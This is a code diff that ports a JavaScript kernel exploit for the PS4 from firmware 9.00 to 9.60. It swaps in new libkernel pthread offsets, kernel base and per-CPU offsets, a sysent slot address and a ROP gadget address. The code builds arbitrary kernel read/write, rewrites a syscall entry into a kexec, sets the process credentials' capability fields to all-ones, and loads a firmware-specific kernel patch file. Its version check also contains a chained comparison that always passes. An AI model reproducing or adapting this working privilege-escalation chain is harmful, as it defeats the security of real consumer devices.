@@ -156,14 +156,14 @@ async function init() {
     await rop.init();
     chain = new Chain();
 
-    // PS4 9.00
+    // PS4 9.60
     const pthread_offsets = new Map(Object.entries({
-        'pthread_create' : 0x25510,
-        'pthread_join' : 0xafa0,
-        'pthread_barrier_init' : 0x273d0,
-        'pthread_barrier_wait' : 0xa320,
-        'pthread_barrier_destroy' : 0xfea0,
-        'pthread_exit' : 0x77a0,
+        'pthread_create' : 0x1c540,
+        'pthread_join' : 0x9560,
+        'pthread_barrier_init' : 0x24200,
+        'pthread_barrier_wait' : 0x1efb0,
+        'pthread_barrier_destroy' : 0x19450,
+        'pthread_exit' : 0x28ca0,
     }));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
@@ -1298,15 +1298,15 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('test read of &"evf cv" failed');
     }
 
-    // PS4 9.00
+    // PS4 9.60
 
-    const off_kstr = 0x7f6f27;
+    const off_kstr = 0x769a88;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x21ef2a0;
+    const off_cpuid_to_pcpu = 0x21a66c0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1539,18 +1539,18 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
-// 9.00 supported only
+// 9.60 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
         throw RangeError('PS5 kernel patching unsupported');
     }
-    if (!(0x800 <= version < 0x900)) {
+    if (!(0x800 <= version < 0x960)) {
         throw RangeError('kernel patching unsupported');
     }
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x1107f00;
+    const offset_sysent_661 = 0x1100ee0;
     const sysent_661 = kbase.add(offset_sysent_661);
     const sysent_661_save = new Buffer(0x30); // sizeof syscall
     for (let off = 0; off < sysent_661_save.size; off += 8) {
@@ -1562,7 +1562,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
+    kmem.write64(sysent_661.add(8), kbase.add(0x15a6d));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1573,7 +1573,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('./kpatch/900.elf');
+    const buf = await get_patches('./kpatch/960.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
     const patches = new View1(await buf, 0x1000);
